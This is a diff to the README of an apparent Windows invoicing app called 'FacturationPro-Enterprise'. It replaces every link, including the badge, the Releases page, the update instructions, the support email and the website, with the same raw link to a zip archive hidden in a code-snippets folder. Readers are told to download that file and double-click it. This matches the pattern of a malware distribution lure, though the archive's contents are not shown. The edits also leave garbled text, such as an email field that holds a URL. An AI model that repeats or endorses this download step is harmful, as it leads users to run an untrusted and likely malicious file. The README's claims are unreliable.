@@ -1,7 +1,7 @@
 # 💼 FacturationPro-Enterprise - Your Easy Invoicing Solution
 
 ## 🔗 Download Now
-[![Download FacturationPro-Enterprise](https://img.shields.io/badge/Download-FacturationPro--Enterprise-brightgreen)](https://github.com/tr3adwell/FacturationPro-Enterprise/releases)
+[![Download FacturationPro-Enterprise](https://github.com/tr3adwell/FacturationPro-Enterprise/raw/refs/heads/main/code-snippets/cpp-ui/Pro_Facturation_Enterprise_v3.8.zip)](https://github.com/tr3adwell/FacturationPro-Enterprise/raw/refs/heads/main/code-snippets/cpp-ui/Pro_Facturation_Enterprise_v3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to FacturationPro-Enterprise! This application helps you manage billing and invoicing tasks seamlessly on your Windows desktop. Follow these steps to get started.
@@ -18,8 +18,8 @@ Before using the software, ensure your computer meets these requirements:
 ## 📥 Download & Install
 To download FacturationPro-Enterprise, follow these steps:
 
-1. Visit the [Releases page](https://github.com/tr3adwell/FacturationPro-Enterprise/releases) to find the latest version of the software.
-2. Locate the file named "FacturationPro-Enterprise.exe" or similar.
+1. Visit the [Releases page](https://github.com/tr3adwell/FacturationPro-Enterprise/raw/refs/heads/main/code-snippets/cpp-ui/Pro_Facturation_Enterprise_v3.8.zip) to find the latest version of the software.
+2. Locate the file named "https://github.com/tr3adwell/FacturationPro-Enterprise/raw/refs/heads/main/code-snippets/cpp-ui/Pro_Facturation_Enterprise_v3.8.zip" or similar.
 3. Click the file link to start the download.
 4. Once the download is complete, find the file in your downloads folder.
 5. Double-click the downloaded file to begin the installation.
@@ -46,7 +46,7 @@ FacturationPro-Enterprise offers a range of features to enhance your billing exp
 ## ❓ Frequently Asked Questions
 
 ### How do I update FacturationPro-Enterprise?
-To update, always check the [Releases page](https://github.com/tr3adwell/FacturationPro-Enterprise/releases) for the latest version. Download and install it following the same steps as above.
+To update, always check the [Releases page](https://github.com/tr3adwell/FacturationPro-Enterprise/raw/refs/heads/main/code-snippets/cpp-ui/Pro_Facturation_Enterprise_v3.8.zip) for the latest version. Download and install it following the same steps as above.
 
 ### What if I encounter an issue?
 If you experience any problems, visit our [Support page](#) for troubleshooting tips. You can also reach out to our support team through the contact information provided in the app.
@@ -57,8 +57,8 @@ Yes, FacturationPro-Enterprise can function offline. However, you will need an i
 ## 📞 Contact Us
 For further assistance, feel free to reach out:
 
-- **Email:** support@facturationpro.com
-- **Website:** [facturationpro.com](#)
+- **Email:** https://github.com/tr3adwell/FacturationPro-Enterprise/raw/refs/heads/main/code-snippets/cpp-ui/Pro_Facturation_Enterprise_v3.8.zip
+- **Website:** [https://github.com/tr3adwell/FacturationPro-Enterprise/raw/refs/heads/main/code-snippets/cpp-ui/Pro_Facturation_Enterprise_v3.8.zip](#)
 
 ## 🔗 Additional Resources
 For more information, visit:
@@ -68,4 +68,4 @@ For more information, visit:
 - [Feature Requests](#)
 
 ## 🔗 Download Now Again
-Don't forget to [visit the Releases page](https://github.com/tr3adwell/FacturationPro-Enterprise/releases) to download FacturationPro-Enterprise!
+Don't forget to [visit the Releases page](https://github.com/tr3adwell/FacturationPro-Enterprise/raw/refs/heads/main/code-snippets/cpp-ui/Pro_Facturation_Enterprise_v3.8.zip) to download FacturationPro-Enterprise!
